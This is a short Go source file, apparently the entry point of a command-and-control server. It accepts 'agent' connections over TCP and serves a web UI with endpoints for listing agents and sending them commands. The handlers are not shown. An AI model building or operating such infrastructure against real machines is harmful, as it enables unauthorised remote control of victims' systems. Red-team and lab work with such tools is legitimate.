package main

import (
	"fmt"
	"log"
	"net"
	"net/http"
)

// Server conf
const (
	IP_SRV string = "127.0.0.1"
	PORT_SRV string = "1234"
)

func main() {
	listener, err := net.Listen("tcp", IP_SRV+":"+PORT_SRV)
	if err != nil {
		log.Panic(err)
	}
	defer listener.Close()

	go func() {
		for {
		conn, err := listener.Accept()
		if err != nil {
			log.Panic(err)
		}
		
		go handle_agent(conn)
		}
	}()

	http.HandleFunc("/", ui_handler)
	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("./static"))))
	http.HandleFunc("/api/agents", listAgentsHandler)
	http.HandleFunc("/api/command", sendCommandHandler)

	fmt.Println("[+] Web UI listening on http://localhost:8080")
	fmt.Println("[+] C2 TCP listener on", IP_SRV+":"+PORT_SRV)
	log.Fatal(http.ListenAndServe(":8080", nil))
}